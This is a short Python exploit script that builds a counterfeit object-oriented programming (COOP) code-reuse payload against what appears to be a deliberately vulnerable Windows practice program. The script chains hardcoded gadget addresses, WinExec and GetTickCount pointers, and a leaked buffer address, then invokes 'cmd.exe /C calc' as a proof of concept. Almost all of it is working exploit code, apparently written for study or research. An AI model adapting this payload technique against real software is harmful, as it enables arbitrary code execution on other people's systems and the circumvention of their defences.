from pwintools import *
import sys

#proc = Process("../COOP_Vuln_program/x64/Debug/COOP_Vuln_program.exe")
WinExec = p64(0x7ffb1ebb6200)
GetTick = p64(0x7ffb1eb65950)
#WinExex = proc.get_proc_address('kernel32.dll','WinExec')
main_loop_gadget = p64(0x140018600)
inv_gadget = p64(0x140018770)
inv_ret_gadget = p64(0x1400187C0)
oe_cond_gadget = p64(0x140018720) 
#proc.recvuntil(b'COOP buffer at:')
#buff_addr = proc.recvline()
buff_addr = int(input("Insert leaked address: "),16)
PAYLOAD = p64(buff_addr+0x18)+\
    p64(buff_addr+0x20)+\
    p64(0x3)+\
    main_loop_gadget+\
    p64(buff_addr+0x38)+\
    p64(buff_addr+0x48)+\
    p64(buff_addr+0x60)+\
    p64(buff_addr+0x58)+\
    GetTick+\
    p64(buff_addr+0x88)+\
    p64(0x0)+\
    inv_ret_gadget+\
    p64(buff_addr+0x80)+\
    p64(buff_addr+0x90)+\
    WinExec+\
    p64(buff_addr+0xa0)+\
    inv_gadget+\
    oe_cond_gadget+\
    b"cmd.exe /C calc"+\
    b"\x00"+\
    b"notepad.exe"
#proc.recvuntil(b'size:')
input ("Press any key... ")
#proc.sendline(len(PAYLOAD))
#proc.recvuntil(b'buffer:')
#proc.sendline(PAYLOAD)
#sys.stdout.buffer.write(PAYLOAD)
print(PAYLOAD)